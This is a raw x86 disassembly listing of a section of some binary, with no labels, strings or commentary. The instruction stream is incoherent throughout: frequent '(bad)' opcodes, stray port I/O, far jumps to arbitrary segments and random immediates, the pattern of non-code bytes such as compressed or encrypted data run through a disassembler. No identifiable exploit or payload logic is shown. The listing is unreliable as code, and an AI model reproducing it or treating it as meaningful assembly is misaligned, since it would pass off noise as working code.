  42c8d8:	push   ebx
  42c8d9:	test   bh,bl
  42c8db:	xchg   edx,eax
  42c8dc:	out    dx,eax
  42c8dd:	fisttp DWORD PTR [eax]
  42c8df:	retf   0xb153
  42c8e2:	jmp    0x42c86f
  42c8e4:	sbb    esp,0x5cd416bf
  42c8ea:	sub    BYTE PTR [ebx-0x5c],0xe4
  42c8ee:	loopne 0x42c8ea
  42c8f0:	mov    eax,0xd31f6970
  42c8f5:	push   ebx
  42c8f6:	repnz fwait
  42c8f8:	sub    al,0x10
  42c8fa:	pop    edi
  42c8fb:	adc    BYTE PTR [eax-0x340b583a],ch
  42c901:	cmp    DWORD PTR [ecx+0x42],esp
  42c904:	sbb    eax,0xbf8a8ec4
  42c909:	push   esi
  42c90a:	mov    WORD PTR [edx-0x46],gs
  42c90d:	push   ebp
  42c90e:	in     eax,0x4d
  42c910:	aam    0x8e
  42c912:	(bad)  
  42c913:	lock bound esi,QWORD PTR [edi-0x29]
  42c917:	and    eax,0xfd16342f
  42c91c:	sbb    BYTE PTR [edi],dh
  42c91e:	stos   DWORD PTR es:[edi],eax
  42c91f:	(bad)  
  42c920:	pop    edx
  42c921:	xchg   ebx,eax
  42c922:	jno    0x42c8b3
  42c924:	or     ecx,eax
  42c926:	mov    WORD PTR [esi-0x30],ss
  42c929:	fnstsw WORD PTR [edi-0x44]
  42c92c:	cmp    ebx,ebp
  42c92e:	neg    ecx
  42c930:	push   0xcbd1b5e
  42c935:	fsubr  QWORD PTR [ecx+0x36]
  42c938:	jmp    0x52ad:0xb97a689b
  42c93f:	popa   
  42c940:	mov    esp,0x24f27c5e
  42c945:	icebp  
  42c946:	outs   dx,DWORD PTR ds:[esi]
  42c947:	lods   eax,DWORD PTR ds:[esi]
  42c948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c949:	dec    edi
  42c94a:	rcr    DWORD PTR [edi],1
  42c94c:	inc    ecx
  42c94d:	and    eax,0x897e71dc
  42c952:	rcr    eax,1
  42c954:	dec    edi
  42c955:	mov    eax,ds:0x16d7471a
  42c95a:	daa    
  42c95b:	push   esp
  42c95c:	cld    
  42c95d:	add    cl,bl
  42c95f:	or     DWORD PTR [esi+0x65],esp
  42c962:	dec    ecx
  42c963:	idiv   bh
  42c965:	pop    eax
  42c966:	jg     0x42c959
  42c968:	mov    cl,0x5d
  42c96a:	pushf  
  42c96b:	call   0x434ff4
	...
  42c9d4:	add    BYTE PTR [eax],al
  42c9d6:	adc    BYTE PTR [ebx],bl
  42c9d8:	leave  
  42c9d9:	jmp    0xfb73c5a9
  42c9de:	(bad)  
  42c9df:	scas   eax,DWORD PTR es:[edi]
  42c9e0:	inc    edi
  42c9e1:	call   0x862885ad
  42c9e6:	fiadd  WORD PTR [bx+di]
  42c9e9:	add    BYTE PTR [eax],al
  42c9eb:	add    DWORD PTR [eax],eax
  42c9ed:	add    BYTE PTR [esi-0x47862eef],ah
  42c9f3:	mov    DWORD PTR ds:0xac82ef17,ebx
  42c9f9:	jo     0x42ca57
  42c9fb:	in     eax,0xa7
  42c9fd:	js     0x42ca08
  42c9ff:	jbe    0x42c9e2
  42ca01:	xchg   DWORD PTR [edx],esp
  42ca03:	adc    eax,0x195e1ab5
  42ca08:	dec    esi
  42ca09:	or     dh,BYTE PTR [ecx]
  42ca0b:	inc    esp
  42ca0c:	pop    eax
  42ca0d:	cs ret 
  42ca0f:	or     esp,DWORD PTR [edx-0x5a96a1e8]
  42ca15:	loop   0x42c9ba
  42ca17:	sub    ah,BYTE PTR [edi+0x36]
  42ca1a:	scas   eax,DWORD PTR es:[edi]
  42ca1b:	(bad)  
  42ca1c:	adc    ax,0xe140
  42ca20:	shl    DWORD PTR [esi+0x7e103ccf],1
  42ca26:	test   BYTE PTR [esi+0x41d1dd24],bl
  42ca2c:	xor    dl,dh
  42ca2e:	mov    edi,0xae1951f6
  42ca33:	mov    ch,0x1c
  42ca35:	xchg   edx,eax
  42ca36:	jb     0x42ca89
  42ca38:	mov    al,0x95
  42ca3a:	mov    dl,0xc9
  42ca3c:	xlat   BYTE PTR ds:[ebx]
  42ca3d:	mov    cl,0x8f
  42ca3f:	in     eax,dx
  42ca40:	xchg   ecx,eax
  42ca41:	out    0x10,eax
  42ca43:	add    DWORD PTR [edi],edx
  42ca45:	bound  edx,QWORD PTR [esi+0x26]
  42ca48:	inc    esi
  42ca49:	(bad)  
  42ca4a:	xor    ebx,edx
  42ca4c:	inc    ebp
  42ca4d:	inc    ebp
  42ca4e:	out    dx,al
  42ca4f:	dec    esp
  42ca50:	mov    ah,0x7d
  42ca52:	out    0x26,eax
  42ca54:	mov    esp,0xcdd80876
  42ca59:	pop    es
  42ca5a:	bound  esp,QWORD PTR [edx+0x454348c8]
  42ca60:	mov    dl,0x2
  42ca62:	mov    bl,0x5f
  42ca64:	cmp    al,0xed
  42ca66:	rcr    DWORD PTR [esi-0xd4512ed],cl
  42ca6c:	out    0x92,al
  42ca6e:	rol    BYTE PTR [edx+0x3c],1
  42ca71:	sub    al,0x78
  42ca73:	push   ss
  42ca74:	push   ebp
  42ca75:	mov    al,0x82
  42ca77:	cli    
  42ca78:	xchg   esp,eax
  42ca79:	pop    es
  42ca7a:	or     DWORD PTR [edi-0x3e2d12fb],0xf33f5f09
  42ca84:	inc    ebp
  42ca85:	jne    0x42ca0e
  42ca87:	sti    
  42ca88:	jmp    0x78c8d30c
  42ca8d:	fs cli 
  42ca8f:	xor    DWORD PTR [eax],ebp
  42ca91:	xor    dl,ah
  42ca93:	mov    esp,0x20ca483c
  42ca98:	retf   0xa23e
  42ca9b:	out    dx,eax
  42ca9c:	pusha  
  42ca9d:	je     0x42ca8e
  42ca9f:	into   
  42caa0:	mov    ds:0x7579420,al
  42caa5:	mov    DWORD PTR ds:0x2df4b1e1,edx
  42caab:	mov    WORD PTR [esi-0x6],fs
  42caae:	sbb    ecx,DWORD PTR [ebp+0x24cab2d2]
  42cab4:	xlat   BYTE PTR ds:[ebx]
  42cab5:	nop    edx
  42cab8:	cmc    
  42cab9:	fnsave [ebx]
  42cabb:	add    dh,BYTE PTR [edx+0x4690fc7e]
  42cac1:	sbb    eax,0x4521a0a7
  42cac6:	sbb    al,BYTE PTR [esi+0x4e]
  42cac9:	xchg   ebp,eax
  42caca:	je     0x42caa6
  42cacc:	lods   al,BYTE PTR ds:[esi]
  42cacd:	push   DWORD PTR [edi+0x11]
  42cad0:	adc    edx,DWORD PTR [ecx]
  42cad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cad3:	push   esp
  42cad4:	ins    DWORD PTR es:[edi],dx
  42cad5:	mov    bh,0xc6
  42cad7:	sub    DWORD PTR [ebx+0x46],0x3a
  42cadb:	mov    edx,0x3f0de75d
  42cae0:	pushf  
  42cae1:	mov    ebx,0xa8660e5b
  42cae6:	push   DWORD PTR [ebx]
  42cae8:	fs sub eax,0xe8c5f7bc
	...
  42cb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb57:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cb5d:	(bad)  
  42cb5e:	fadd   QWORD PTR [ebp-0x385f9140]
  42cb64:	jno    0x42cbc9
  42cb66:	fild   WORD PTR [bx+di]
  42cb69:	add    BYTE PTR [eax],al
  42cb6b:	add    DWORD PTR [eax],eax
  42cb6d:	add    BYTE PTR [esi+0x6af5caf],dl
  42cb73:	push   0x3e7a595b
  42cb78:	imul   ebx,edi,0x70f65c0a
  42cb7e:	not    BYTE PTR [esi-0x5c9b4db5]
  42cb84:	idiv   DWORD PTR [ecx-0xa64ccf9]
  42cb8a:	addr16 add eax,0xae0f13f7
  42cb90:	addr16 gs and al,0x54
  42cb94:	imul   ebp,DWORD PTR ds:[ecx+0x13d9baee],0x34
  42cb9c:	and    dl,BYTE PTR [ecx+0x79bd8bb1]
  42cba2:	push   ecx
  42cba3:	out    0xc2,eax
  42cba5:	fistp  QWORD PTR ds:0xdbb0b742
  42cbab:	adc    BYTE PTR [esi-0x18],0xf6
  42cbaf:	and    eax,0xbd7dbd44
  42cbb4:	retf   0xd383
  42cbb7:	push   ebx
  42cbb8:	(bad)  
  42cbba:	mov    eax,0x7621b5e2
  42cbbf:	pop    ss
  42cbc0:	gs retf 
  42cbc2:	out    dx,eax
  42cbc3:	xchg   esi,eax
  42cbc4:	xchg   DWORD PTR [edx-0x5e],edx
  42cbc7:	neg    dh
  42cbc9:	cdq    
  42cbca:	ja     0x42cb7b
  42cbcc:	test   eax,0x2fd02e76
  42cbd1:	repz inc ecx
  42cbd3:	ins    DWORD PTR es:[edi],dx
  42cbd4:	xchg   DWORD PTR [ebx+0x36],eax
  42cbd7:	popa   
  42cbd8:	aad    0xd
  42cbda:	adc    eax,0xb5fedb3
  42cbdf:	retf   0xf0e2
  42cbe2:	or     al,0x2e
  42cbe4:	lods   al,BYTE PTR ds:[esi]
  42cbe5:	call   DWORD PTR [edx-0x65910438]
  42cbeb:	and    DWORD PTR [eax],ebx
  42cbed:	(bad)  
  42cbef:	sahf   
  42cbf0:	or     al,BYTE PTR [eax]
  42cbf2:	mov    BYTE PTR [edi],al
  42cbf4:	xor    BYTE PTR [edi],0xb0
  42cbf7:	sub    cl,BYTE PTR [eax-0x3b]
  42cbfa:	addps  xmm3,XMMWORD PTR [edx-0x13]
  42cbfe:	cmp    eax,0x7abca676
  42cc03:	iret   
  42cc04:	ss out dx,eax
  42cc06:	aas    
  42cc07:	jno    0x42cc61
  42cc09:	xchg   ebx,eax
  42cc0a:	push   edx
  42cc0c:	or     al,0x17
  42cc0e:	gs cmp eax,0xf0e6fb02
  42cc14:	loope  0x42cc8e
  42cc16:	push   es
  42cc17:	xchg   ebx,eax
  42cc18:	push   ebp
  42cc19:	and    al,0xbc
  42cc1b:	mov    ds:0xd59f4a62,eax
  42cc20:	stos   BYTE PTR es:[edi],al
  42cc21:	mov    eax,ds:0xd442eb5e
  42cc26:	xor    eax,edx
  42cc28:	int3   
  42cc29:	pop    ebx
  42cc2a:	or     BYTE PTR [esi-0x9],dh
  42cc2d:	mov    ebp,0x6ac45292
  42cc32:	pop    eax
  42cc33:	rol    DWORD PTR [ebp+0x225ac40e],0x8c
  42cc3a:	sbb    DWORD PTR [ebx],ecx
  42cc3c:	(bad)  
  42cc3d:	out    0x19,eax
  42cc3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc40:	mov    al,0xae
  42cc42:	xor    dl,BYTE PTR [ecx+0x315ecc28]
  42cc48:	sbb    BYTE PTR [edx+0x24],dh
  42cc4b:	inc    esp
  42cc4c:	push   cs
  42cc4d:	push   ebx
  42cc4e:	push   ecx
  42cc4f:	(bad)  
  42cc50:	fnsave [edi]
  42cc52:	jmp    0xe52d:0x3070661b
  42cc59:	or     ecx,ecx
  42cc5b:	lds    esp,FWORD PTR [ebx-0x69]
  42cc5e:	popa   
  42cc5f:	mov    cl,ah
  42cc61:	push   edi
  42cc62:	sbb    esi,DWORD PTR [eax+ebp*2-0x213edfca]
  42cc69:	add    eax,esp
  42cc6b:	stc    
  42cc6c:	push   ebx
  42cc6d:	adc    BYTE PTR [eax],al
	...
  42ccd3:	add    BYTE PTR [eax],al
  42ccd5:	add    BYTE PTR [edi+0x2],bh
  42ccd8:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42ccdc:	call   FWORD PTR [ebx]
  42ccde:	fisttp WORD PTR [ebp+0x1]
  42cce1:	or     eax,0x6844c95a
  42cce6:	addr16 loopne 0x42ccea
  42cce9:	add    BYTE PTR [eax],al
  42cceb:	add    DWORD PTR [eax],eax
  42cced:	add    BYTE PTR [ecx],al
  42ccef:	(bad)  
  42ccf0:	ficom  WORD PTR [ebp+ecx*1+0x3f]
  42ccf4:	bound  ecx,QWORD PTR [esi]
  42ccf6:	or     eax,0x986153c4
  42ccfb:	mov    bh,0x9
  42ccfd:	dec    esp
  42ccfe:	pop    ss
  42ccff:	test   eax,0x6e381fba
  42cd04:	mov    dh,0xbb
  42cd06:	adc    edx,DWORD PTR [ecx-0x1b3702f]
  42cd0c:	jnp    0x42cd2f
  42cd0e:	ror    eax,cl
  42cd10:	les    ecx,FWORD PTR [eax]
  42cd12:	xor    esp,ebp
  42cd14:	in     eax,0xeb
  42cd16:	loop   0x42cd00
  42cd18:	mov    al,ds:0xad74d441
  42cd1d:	icebp  
  42cd1e:	call   0x5a21:0x8e55eff7
  42cd25:	xor    bl,BYTE PTR [ebx]
  42cd27:	adc    DWORD PTR [edx+0x65],edx
  42cd2a:	loop   0x42cd3a
  42cd2c:	adc    al,0x57
  42cd2e:	mov    ebp,0x1ec31e1
  42cd33:	mov    BYTE PTR [eax+ecx*8-0x1c],dh
  42cd37:	jb     0x42cd87
  42cd39:	dec    eax
  42cd3a:	in     eax,dx
  42cd3b:	xchg   ecx,eax
  42cd3c:	in     al,0xaf
  42cd3e:	push   es
  42cd3f:	mov    ds:0x380c1a18,al
  42cd44:	mov    ch,ch
  42cd46:	jne    0x42cd30
  42cd48:	sar    BYTE PTR [edi+0x2b],cl
  42cd4b:	mov    esp,0x1feda691
  42cd50:	pop    es
  42cd51:	inc    ebx
  42cd52:	mov    esp,0x170ee887
  42cd57:	mov    eax,ds:0xd6252ba4
  42cd5c:	fisub  WORD PTR [ebx+0x65bb112]
  42cd62:	fnstsw WORD PTR [ebp+0x57]
  42cd65:	repnz mov al,0x62
  42cd68:	sbb    DWORD PTR [ebx+0x20],esi
  42cd6b:	mov    bl,0x26
  42cd6d:	in     eax,dx
  42cd6e:	cmp    bl,dl
  42cd70:	cmp    edi,0x47
  42cd73:	jmp    0x42cd0b
  42cd75:	leave  
  42cd76:	inc    ebp
  42cd77:	jno    0x42cd58
  42cd79:	and    ch,cl
  42cd7b:	mov    fs,WORD PTR ds:[esi]
  42cd7e:	sub    ebp,DWORD PTR [ebx+0x405d0e0c]
  42cd84:	(bad)  
  42cd85:	fsub   QWORD PTR [edx-0x9ccefca]
  42cd8b:	cmp    ecx,edx
  42cd8d:	jmp    0x525f8637
  42cd92:	out    dx,eax
  42cd93:	and    BYTE PTR [eax],cl
  42cd95:	push   ds
  42cd96:	sub    cl,al
  42cd98:	into   
  42cd99:	or     cl,BYTE PTR [edx]
  42cd9b:	xor    dl,dh
  42cd9d:	cmp    ch,BYTE PTR [ebx+edx*1-0x2b]
  42cda1:	add    eax,0x479bc5c4
  42cda6:	loope  0x42cd86
  42cda8:	mov    BYTE PTR [eax+0x1d5b61b5],dh
  42cdae:	in     al,dx
  42cdaf:	dec    ebp
  42cdb0:	nop
  42cdb1:	dec    esp
  42cdb2:	rcr    BYTE PTR [esi+0x3c],0x7d
  42cdb6:	add    eax,0xb1fd18c0
  42cdbb:	cmp    ebp,esp
  42cdbd:	les    ebx,FWORD PTR [edi]
  42cdbf:	lds    ebp,FWORD PTR [edx]
  42cdc1:	jp     0x42cd62
  42cdc3:	mov    ds:0x6d01ae51,al
  42cdc8:	xchg   esp,eax
  42cdc9:	push   ss
  42cdca:	pushf  
  42cdcb:	and    ch,0x23
  42cdce:	(bad)  
  42cdcf:	jmp    0x7389:0xec5628cd
  42cdd6:	fmul   DWORD PTR [edi-0x3e]
  42cdd9:	cmc    
  42cdda:	cmp    DWORD PTR [esi+0x55f2ff05],ebp
  42cde0:	sub    bh,bh
  42cde2:	mov    eax,ds:0x146f84ef
  42cde7:	jb     0x42ce1f
  42cde9:	inc    ebp
  42cdea:	fldenv fs:[ecx]
  42cded:	test   eax,0x0
	...
  42ce56:	sbb    DWORD PTR [ecx-0x20017802],esp
  42ce5c:	jns    0x42ce1d
  42ce5e:	xchg   BYTE PTR [esi],dh
  42ce60:	xchg   esi,eax
  42ce61:	mov    ch,0xb5
  42ce63:	sbb    al,0x2d
  42ce65:	out    0x67,eax
  42ce67:	loope  0x42ce6a
  42ce69:	add    BYTE PTR [eax],al
  42ce6b:	add    DWORD PTR [eax],eax
  42ce6d:	add    al,dl
  42ce6f:	mov    dh,0x80
  42ce71:	aam    0xb9
  42ce73:	in     eax,0x4e
  42ce75:	aad    0x9c
  42ce77:	push   esi
  42ce78:	clc    
  42ce79:	dec    edx
  42ce7a:	sub    eax,0xbdbbdeca
  42ce7f:	mov    ebp,0x4bd042a3
  42ce84:	jns    0x42ceb9
  42ce86:	outs   dx,DWORD PTR ds:[esi]
  42ce87:	stos   BYTE PTR es:[edi],al
  42ce88:	xor    BYTE PTR [esi-0x3c713c78],ah
  42ce8e:	or     DWORD PTR [edi-0x56445ce0],edx
  42ce94:	push   es
  42ce95:	inc    esi
  42ce96:	inc    ebx
  42ce97:	sbb    eax,DWORD PTR ds:0xfd2f10e7
  42ce9d:	and    esp,DWORD PTR [ecx+0x6e]
  42cea0:	inc    ebp
  42cea1:	sbb    bh,dh
  42cea3:	idiv   dl
  42cea5:	loope  0x42cf1d
  42cea7:	ffree  st(2)
  42cea9:	sbb    al,0x2
  42ceab:	jns    0x42ced3
  42cead:	lds    edi,FWORD PTR [eax-0x48165e89]
  42ceb3:	ds arpl bx,di
  42ceb6:	jp     0x42cef2
  42ceb8:	std    
  42ceb9:	dec    ebp
  42ceba:	pop    edi
  42cebb:	xchg   edx,eax
  42cebc:	dec    edx
  42cebd:	xchg   ebp,eax
  42cebe:	out    0x5a,al
  42cec0:	mov    al,0xc3
  42cec2:	adc    bh,ah
  42cec4:	out    0xb1,al
  42cec6:	cs inc esi
  42cec8:	mov    esp,0x73e20b75
  42cecd:	clc    
  42cece:	cmp    eax,0x8f05bf4a
  42ced3:	fsub   QWORD PTR [esi+0x62]
  42ced6:	les    esp,FWORD PTR [esi-0x59bba5e2]
  42cedc:	and    al,0x55
  42cede:	mov    ebx,0x31cb27a4
  42cee3:	aam    0xaf
  42cee5:	retf   
  42cee6:	lea    ecx,[ecx+0x61d27bb0]
  42ceec:	pushf  
  42ceed:	iret   
  42ceee:	rol    DWORD PTR [eax+0x543a8b62],1
  42cef4:	je     0x42cf75
  42cef6:	push   ds
  42cef7:	lock loop 0x42ce9c
  42cefa:	or     ebp,esp
  42cefc:	in     al,0xc6
  42cefe:	sbb    cl,BYTE PTR [eax-0x5b92eee6]
  42cf04:	hlt    
  42cf05:	mov    eax,ds:0x46d544f3
  42cf0a:	loop   0x42ceb3
  42cf0c:	jns    0x42cf16
  42cf0e:	and    eax,0xe2efb5
  42cf13:	repz inc DWORD PTR [ecx]
  42cf16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cf17:	pop    edx
  42cf18:	aad    0x14
  42cf1a:	jge    0x42cf80
  42cf1c:	aam    0xd1
  42cf1e:	out    0x0,eax
  42cf20:	ss sti 
  42cf22:	je     0x42cf7e
  42cf24:	stos   BYTE PTR es:[edi],al
  42cf25:	inc    ecx
  42cf26:	mov    eax,ecx
  42cf28:	jg     0x42cf74
  42cf2a:	jge    0x42cf65
  42cf2c:	int    0xbb
  42cf2e:	sbb    al,0x55
  42cf30:	addr16 mov cl,cl
  42cf33:	mov    ecx,0x6839f2b6
  42cf38:	jbe    0x42cf06
  42cf3a:	jnp    0x42cf50
  42cf3c:	nop
  42cf3d:	call   0x61495b81
  42cf42:	mov    esi,0x2ca5fbf4
  42cf47:	repz imul ebp,DWORD PTR [eax+0x5d654552],0xffffffe1
  42cf4f:	jno    0x42cfa2
  42cf51:	inc    esi
  42cf52:	ret    
  42cf53:	aas    
  42cf54:	sbb    cl,ah
  42cf56:	mov    al,0x4c
  42cf58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf59:	pop    ss
  42cf5a:	mov    WORD PTR [esi-0x11776269],?
  42cf60:	les    esi,FWORD PTR [ebx+0x57]
  42cf63:	mov    ebp,DWORD PTR [ebp+0x6ef83f27]
  42cf69:	inc    edx
  42cf6a:	shr    BYTE PTR [ebx-0x44],0x68
	...
  42cfd6:	jae    0x42d015
  42cfd8:	fadd   st,st(1)
  42cfda:	fsubrp st(5),st
  42cfdc:	jnp    0x42cf9d
  42cfde:	or     al,BYTE PTR [esi]
  42cfe0:	cld    
  42cfe1:	les    ecx,FWORD PTR [edx]
  42cfe3:	inc    esi
  42cfe4:	rcl    BYTE PTR [ecx+0x1e267],1
  42cfea:	add    BYTE PTR [ecx],al
  42cfec:	add    BYTE PTR [eax],al
  42cfee:	lods   al,BYTE PTR ds:[esi]
  42cfef:	(bad)  
  42cff0:	mov    dl,0x81
  42cff2:	sub    esp,eax
  42cff4:	bound  ecx,QWORD PTR [ebx]
  42cff6:	jbe    0x42cfe0
  42cff8:	and    al,0xf2
  42cffa:	adc    BYTE PTR [edi+0x7ae8609],bl
  42d000:	xchg   edx,eax
  42d001:	and    dl,BYTE PTR [ebx-0x3526114d]
  42d007:	pop    edx
  42d008:	adc    eax,0xbff08342
  42d00d:	sub    BYTE PTR [edi+0x46],bh
  42d010:	loope  0x42cfc0
  42d012:	jbe    0x42d003
  42d014:	add    al,0x5
  42d016:	addr16 aaa 
  42d018:	sbb    edx,DWORD PTR [ecx-0x5c]
  42d01b:	jg     0x42d060
  42d01d:	(bad)  
  42d01e:	mov    dl,0x93
  42d020:	imul   eax,DWORD PTR [ebx-0x2f],0x27
  42d024:	(bad)  
  42d025:	pop    ebp
  42d026:	mov    ebp,gs
  42d028:	pop    esi
  42d029:	xor    DWORD PTR [ecx+0x5d39ffb7],edx
  42d02f:	mov    ah,0x98
  42d031:	repnz jmp 0xe80e:0xdb700097
  42d039:	and    eax,0x5bacbf16
  42d03e:	cmp    al,BYTE PTR [edi+eiz*1-0x7733d3fc]
  42d045:	neg    BYTE PTR [esi+0x130dc610]
  42d04b:	inc    DWORD PTR [edx]
  42d04d:	inc    edx
  42d04f:	pop    eax
  42d050:	(bad)  
  42d051:	xor    DWORD PTR [ebp+0x8951817],edi
  42d057:	or     DWORD PTR [esi+ecx*1],esp
  42d05a:	loopne 0x42d093
  42d05c:	popa   
  42d05d:	inc    edx
  42d05e:	gs push ebx
  42d060:	fdiv   QWORD PTR [esi+ecx*2+0x1a]
  42d064:	jne    0x42d00f
  42d066:	es jg  0x42d08e
  42d069:	mov    edx,0xbb40279a
  42d06e:	out    dx,al
  42d06f:	xchg   ebx,eax
  42d070:	xchg   edi,eax
  42d071:	and    al,0x5a
  42d073:	in     al,0x27
  42d075:	mov    al,BYTE PTR [edx-0x79f19bee]
  42d07b:	out    0x1a,eax
  42d07d:	cld    
  42d07e:	out    0xaa,eax
  42d080:	ins    BYTE PTR es:[edi],dx
  42d081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d082:	fdivr  DWORD PTR [eax-0x24]
  42d085:	rcr    DWORD PTR [edi-0x3c],0x77
  42d089:	sbb    ecx,esp
  42d08b:	sahf   
  42d08c:	cmp    ebx,DWORD PTR [ebp-0x60ddbabb]
  42d092:	fidivr WORD PTR [edi+eiz*4]
  42d095:	jmp    FWORD PTR [ebx]
  42d097:	jge    0x42d104
  42d099:	inc    edi
  42d09a:	jae    0xec1e9dba
  42d0a0:	aad    0xd6
  42d0a2:	mov    ebx,0xd31c6ed
  42d0a7:	retf   0x8365
  42d0aa:	mov    bh,0xca
  42d0ac:	lea    esi,[edx+0x6e0b3211]
  42d0b2:	add    eax,0x556709b2
  42d0b7:	sub    ebx,eax
  42d0b9:	(bad)  
  42d0ba:	sub    dh,BYTE PTR [edi-0x2c]
  42d0bd:	sbb    DWORD PTR [ecx+0x23],esp
  42d0c0:	stos   BYTE PTR es:[edi],al
  42d0c1:	jbe    0x42d11e
  42d0c3:	pop    edi
  42d0c4:	xchg   ebx,eax
  42d0c5:	enter  0x6f7e,0x78
  42d0c9:	sub    ebx,DWORD PTR [edi+esi*1+0x23ca9a46]
  42d0d0:	repz adc al,0xa1
  42d0d3:	(bad)  
  42d0d5:	inc    ebx
  42d0d6:	lock adc ah,0x16
  42d0da:	dec    edx
  42d0db:	jl     0x42d05f
  42d0dd:	imul   ebp,DWORD PTR [ebp-0x748c429b],0xffffffb6
  42d0e4:	bound  ebp,QWORD PTR [edx+0x11]
  42d0e7:	std    
  42d0e8:	dec    edi
  42d0e9:	xor    eax,0xb08483c4
	...
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    dl,ch
  42d163:	ja     0x42d16a
  42d165:	(bad)  
  42d166:	jcxz   0x42d16a
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR [ebx],dh
  42d16f:	int3   
  42d170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d171:	and    eax,0xae0b1b30
  42d176:	mov    al,0x6a
  42d178:	loop   0x42d17b
  42d17a:	jg     0x42d1a5
  42d17c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d17d:	sbb    cl,ch
  42d17f:	sub    ah,BYTE PTR ds:0x87f23423
  42d185:	std    
  42d186:	mov    bh,0x86
  42d188:	rcl    DWORD PTR [edx+ebp*1-0x4],0x78
  42d18d:	jno    0x42d11b
  42d18f:	and    eax,0x2eef00b
  42d194:	test   BYTE PTR [ebp-0x11],0x3e
  42d198:	sub    al,0x84
  42d19a:	push   esi
  42d19b:	jb     0x42d1ca
  42d19d:	lock push esi
  42d19f:	data16 lods al,BYTE PTR ds:[esi]
  42d1a1:	lods   eax,DWORD PTR ds:[esi]
  42d1a2:	and    DWORD PTR [eax],0xffffffb0
  42d1a5:	lahf   
  42d1a6:	sub    DWORD PTR [edx],ecx
  42d1a8:	inc    DWORD PTR [edx]
  42d1aa:	ror    BYTE PTR [edi-0x5f],cl
  42d1ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1ae:	jae    0x42d179
  42d1b0:	int3   
  42d1b1:	(bad)  
  42d1b2:	or     esp,DWORD PTR [edx+0x706b485b]
  42d1b8:	leave  
  42d1b9:	and    al,0x34
  42d1bb:	dec    ebp
  42d1bc:	aam    0x60
  42d1be:	loope  0x42d16a
  42d1c0:	out    dx,eax
  42d1c1:	or     al,0x7b
  42d1c3:	xor    al,0xad
  42d1c5:	fsubr  QWORD PTR [eax+0x3ea78053]
  42d1cb:	add    dh,BYTE PTR [edx+ebx*8]
  42d1ce:	sti    
  42d1cf:	xchg   edi,eax
  42d1d0:	in     al,0x49
  42d1d2:	iret   
  42d1d3:	mov    ebx,eax
  42d1d5:	stos   BYTE PTR es:[edi],al
  42d1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1d7:	mov    WORD PTR fs:[eax-0x2b],fs
  42d1db:	cli    
  42d1dc:	adc    eax,edi
  42d1de:	mov    ah,BYTE PTR [eax-0x68]
  42d1e1:	adc    al,0x92
  42d1e3:	push   0xffffffa3
  42d1e5:	inc    esp
  42d1e6:	aad    0xc5
  42d1e8:	mov    ds:0x19d744a9,al
  42d1ed:	mul    DWORD PTR [ebx+ebp*2+0x46]
  42d1f1:	mov    ah,0x1f
  42d1f3:	addr16 out dx,al
  42d1f5:	mov    bl,0xfb
  42d1f7:	push   ss
  42d1f8:	iret   
  42d1f9:	push   ebp
  42d1fa:	push   edi
  42d1fb:	shl    DWORD PTR [ebx+0x7f5b334c],cl
  42d201:	loopne 0x42d223
  42d203:	adc    eax,0x2e458b4
  42d208:	ret    0xc8f5
  42d20b:	rol    DWORD PTR [esi],cl
  42d20d:	out    0x54,al
  42d20f:	pop    esp
  42d210:	jb     0x42d1e2
  42d212:	push   ecx
  42d213:	or     ch,dh
  42d215:	inc    edi
  42d216:	outs   dx,DWORD PTR ds:[esi]
  42d217:	sub    edi,DWORD PTR [eax+0x4f]
  42d21a:	mov    ds:0x719eda43,al
  42d21f:	div    BYTE PTR [edx]
  42d221:	in     al,0x53
  42d223:	cmp    al,0x45
  42d225:	push   0xffffffbd
  42d227:	mov    ecx,0xf6f8f262
  42d22c:	pop    ds
  42d22d:	dec    ebx
  42d22e:	mov    ecx,0x6ded0ff5
  42d233:	jne    0x42d240
  42d235:	mov    BYTE PTR [eax-0x374b0098],dh
  42d23b:	out    0xc9,eax
  42d23d:	lods   al,BYTE PTR ds:[esi]
  42d23e:	sub    ebp,DWORD PTR ds:0x7458a7eb
  42d244:	cld    
  42d245:	popf   
  42d246:	les    ebp,FWORD PTR [edx+0x57363fbc]
  42d24c:	(bad)
  42d24f:	push   ecx
  42d250:	push   ds
  42d251:	inc    edx
  42d252:	pop    eax
  42d253:	in     eax,0x20
  42d255:	test   BYTE PTR [ebp+edx*2+0x59],0xa8
  42d25a:	mov    ch,0x3b
  42d25c:	mov    ch,0xd
  42d25e:	jo     0x42d217
  42d260:	mov    al,0xb1
  42d262:	pop    es
  42d263:	sbb    DWORD PTR [esi-0x6b],edx
  42d266:	mov    dh,0x99
  42d268:	sbb    dl,dl
  42d26a:	out    dx,al
  42d26b:	imul   eax,DWORD PTR [ebx],0x3a
	...
  42d2d5:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d2ed
  42d2e3:	mov    bh,0xbb
  42d2e5:	jno    0x42d34e
  42d2e7:	in     al,0x1
  42d2e9:	add    BYTE PTR [eax],al
  42d2eb:	add    DWORD PTR [eax],eax
  42d2ed:	add    BYTE PTR [ecx+0x3],ch
  42d2f0:	aaa    
  42d2f1:	idiv   ah
  42d2f3:	pop    ebx
  42d2f4:	retf   
  42d2f5:	les    ecx,FWORD PTR [eax]
  42d2f7:	pusha  
  42d2f8:	sahf   
  42d2f9:	jl     0x42d365
  42d2fb:	or     cl,BYTE PTR [esi+ecx*1+0x3ca4d34a]
